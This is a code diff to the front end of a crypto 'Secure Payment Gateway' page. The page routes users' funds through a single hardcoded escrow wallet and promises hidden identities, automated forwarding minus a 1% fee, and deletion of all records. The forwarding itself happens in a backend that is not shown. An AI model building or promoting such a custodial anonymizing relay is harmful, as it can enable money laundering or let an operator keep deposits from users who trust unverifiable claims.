@@ -341,11 +341,11 @@
     <div class="container">
         <div class="logo">🔒</div>
         <h1>Secure Payment Gateway</h1>
-        <div class="subtitle">Privacy-first transaction system</div>
+        <div class="subtitle">Privacy-first transaction system with automated processing</div>
         
         <div class="security-badge">
             <h3>🛡️ Enhanced Privacy Protection</h3>
-            <p>Your transactions are anonymized • Destination never sees your address</p>
+            <p>Automated backend • Fully verified transactions • Your identity stays hidden</p>
         </div>
 
         <div id="statusBox" class="status-box">
@@ -376,12 +376,12 @@
             </div>
 
             <div class="privacy-note">
-                <h4>🔐 How Privacy Works:</h4>
-                <p>1. You send funds to our secure escrow wallet<br>
-                2. We verify and hold temporarily (3 confirmations)<br>
-                3. We forward to destination minus 1% fee<br>
-                4. Your identity remains hidden from recipient<br>
-                5. All records auto-delete after completion</p>
+                <h4>🔐 How Automated System Works:</h4>
+                <p>1. You send funds to secure escrow wallet<br>
+                2. Backend automatically verifies (3 confirmations)<br>
+                3. Backend auto-forwards to destination (minus 1% fee)<br>
+                4. Backend verifies forward transaction<br>
+                5. All records auto-delete after both verifications complete</p>
             </div>
 
             <div class="payment-form">
@@ -432,26 +432,26 @@
             </div>
 
             <div class="processing-steps" id="processingSteps">
-                <h4 style="margin-bottom: 15px; color: #333;">🔄 Transaction Progress:</h4>
+                <h4 style="margin-bottom: 15px; color: #333;">🔄 Automated Processing:</h4>
                 <div class="step" id="step1">
                     <div class="step-number">1</div>
                     <div class="step-text">Sending to secure escrow...</div>
                 </div>
                 <div class="step" id="step2">
                     <div class="step-number">2</div>
-                    <div class="step-text">Blockchain verification (3 confirmations)...</div>
+                    <div class="step-text">Backend verifying (3 confirmations)...</div>
                 </div>
                 <div class="step" id="step3">
                     <div class="step-number">3</div>
-                    <div class="step-text">Forwarding to destination (minus 1% fee)...</div>
+                    <div class="step-text">Backend auto-forwarding (minus 1% fee)...</div>
                 </div>
                 <div class="step" id="step4">
                     <div class="step-number">4</div>
-                    <div class="step-text">Deleting all transaction records...</div>
+                    <div class="step-text">Backend verifying forward transaction...</div>
                 </div>
                 <div class="step" id="step5">
                     <div class="step-number">5</div>
-                    <div class="step-text">✅ Complete! All data erased.</div>
+                    <div class="step-text">✅ Complete! Backend deleting records...</div>
                 </div>
             </div>
         </div>
@@ -460,9 +460,9 @@
     <script>
         // Configuration - UPDATE THESE!
         const CONFIG = {
-            ESCROW_WALLET: '0x7e4692aaa29fe7632fa0bdc8effd25cc70867d33', // CHANGE: Your wallet that receives all payments
+            ESCROW_WALLET: '0x7e4692aaa29fe7632fa0bdc8effd25cc70867d33', // Your escrow wallet
             FEE_PERCENTAGE: 1, // 1% security fee
-            BACKEND_URL: '/api'
+            BACKEND_URL: 'https://your-backend-url.onrender.com/api' // UPDATE: Your Python backend URL
         };
 
         let currentAccount = null;
@@ -490,7 +490,7 @@
                 currentAccount = accounts[0];
                 currentChainId = await window.ethereum.request({ method: 'eth_chainId' });
 
-                updateStatus('✅ Connected - Your identity is protected', 'connected');
+                updateStatus('✅ Connected - Automated system ready', 'connected');
                 btnText.textContent = '✓ Connected';
                 btn.classList.add('connected');
                 btn.disabled = true;
@@ -580,7 +580,7 @@
             }
 
             try {
-                updateStatus('Processing secure payment...', 'processing');
+                updateStatus('Processing payment...', 'processing');
                 document.getElementById('paymentBtn').disabled = true;
                 document.getElementById('processingSteps').classList.add('show');
                 
@@ -610,18 +610,16 @@
                     securityFee: amount * (CONFIG.FEE_PERCENTAGE / 100),
                     escrowTxHash: txHash,
                     escrowWallet: CONFIG.ESCROW_WALLET,
-                    status: 'pending',
-                    timestamp: new Date().toISOString(),
                     chainId: currentChainId
                 };
 
                 const result = await saveTransaction(transactionData);
                 currentTransactionId = result.transaction.id;
 
-                updateStatus('✅ Payment received in escrow - Verifying...', 'processing');
+                updateStatus('✅ Payment in escrow - Backend processing automatically...', 'processing');
 
-                // Start verification process
-                setTimeout(() => verifyAndForward(currentTransactionId), 15000);
+                // Start monitoring
+                setTimeout(() => monitorTransaction(currentTransactionId), 15000);
 
                 // Clear form
                 document.getElementById('destinationAddress').value = '';
@@ -645,7 +643,7 @@
             }
         }
 
-        // Save transaction
+        // Save transaction to backend
         async function saveTransaction(data) {
             const response = await fetch(`${CONFIG.BACKEND_URL}/transaction`, {
                 method: 'POST',
@@ -657,8 +655,8 @@
             return await response.json();
         }
 
-        // Verify and forward
-        async function verifyAndForward(txId) {
+        // Monitor transaction status
+        async function monitorTransaction(txId) {
             try {
                 const response = await fetch(`${CONFIG.BACKEND_URL}/verify`, {
                     method: 'POST',
@@ -668,55 +666,44 @@
 
                 if (response.ok) {
                     const result = await response.json();
-                    console.log('Status:', result.transaction.status);
+                    const status = result.transaction.status;
                     
-                    // Log verification details
-                    if (result.verifications) {
-                        console.log('Escrow verification:', result.verifications.escrow);
-                        console.log('Forward verification:', result.verifications.forward);
-                    }
+                    console.log('Status:', status);
 
-                    if (result.transaction.status === 'pending') {
-                        // Still waiting for escrow transaction confirmations
-                        setTimeout(() => verifyAndForward(txId), 30000);
-                    } else if (result.transaction.status === 'verified') {
-                        // Escrow verified, about to forward
+                    if (status === 'pending') {
+                        updateStep(2, 'active');
+                        updateStatus('⏳ Backend verifying escrow transaction...', 'processing');
+                        setTimeout(() => monitorTransaction(txId), 20000);
+                    } 
+                    else if (status === 'verified') {
                         updateStep(2, 'completed');
                         updateStep(3, 'active');
-                        updateStatus('✅ Verified - Forwarding to destination...', 'processing');
-                        setTimeout(() => verifyAndForward(txId), 10000);
-                    } else if (result.transaction.status === 'forwarding') {
-                        // Currently sending forward transaction
-                        updateStep(3, 'active');
-                        updateStatus('⏳ Sending to destination...', 'processing');
-                        setTimeout(() => verifyAndForward(txId), 10000);
-                    } else if (result.transaction.status === 'forwarding_pending') {
-                        // Forward transaction sent, waiting for confirmations
-                        updateStep(3, 'active');
-                        updateStatus('⏳ Verifying forward transaction...', 'processing');
-                        setTimeout(() => verifyAndForward(txId), 20000);
-                    } else if (result.transaction.status === 'completed') {
-                        // BOTH transactions verified!
+                        updateStatus('✅ Verified! Backend forwarding to destination...', 'processing');
+                        setTimeout(() => monitorTransaction(txId), 10000);
+                    }
+                    else if (status === 'forwarding_pending') {
                         updateStep(3, 'completed');
                         updateStep(4, 'active');
-                        updateStatus('✅ Both transactions verified - Erasing records...', 'processing');
+                        updateStatus('⏳ Backend verifying forward transaction...', 'processing');
+                        setTimeout(() => monitorTransaction(txId), 20000);
+                    }
+                    else if (status === 'completed') {
+                        updateStep(4, 'completed');
+                        updateStep(5, 'completed');
+                        updateStatus('🎉 Complete! Backend deleting records...', 'connected');
                         setTimeout(() => {
-                            updateStep(4, 'completed');
-                            updateStep(5, 'completed');
-                            updateStatus('✅ Complete! All data has been deleted.', 'connected');
-                            setTimeout(() => {
-                                resetSteps();
-                                document.getElementById('processingSteps').classList.remove('show');
-                                refreshBalance();
-                            }, 5000);
-                        }, 2000);
-                    } else if (result.transaction.status === 'failed') {
+                            resetSteps();
+                            document.getElementById('processingSteps').classList.remove('show');
+                            refreshBalance();
+                        }, 5000);
+                    }
+                    else if (status === 'failed') {
                         updateStatus('❌ Transaction failed', 'error');
                         resetSteps();
                     }
                 }
             } catch (error) {
-                console.error('Verification error:', error);
+                console.error('Monitor error:', error);
             }
         }
 
@@ -777,7 +764,7 @@
                         document.getElementById('connectBtn').classList.add('connected');
                         document.getElementById('btnText').textContent = '✓ Connected';
                         document.getElementById('connectBtn').disabled = true;
-                        updateStatus('✅ Connected - Your identity is protected', 'connected');
+                        updateStatus('✅ Connected - Automated system ready', 'connected');
                         
                         await displayWalletInfo();
                         document.getElementById('walletSection').classList.add('show');
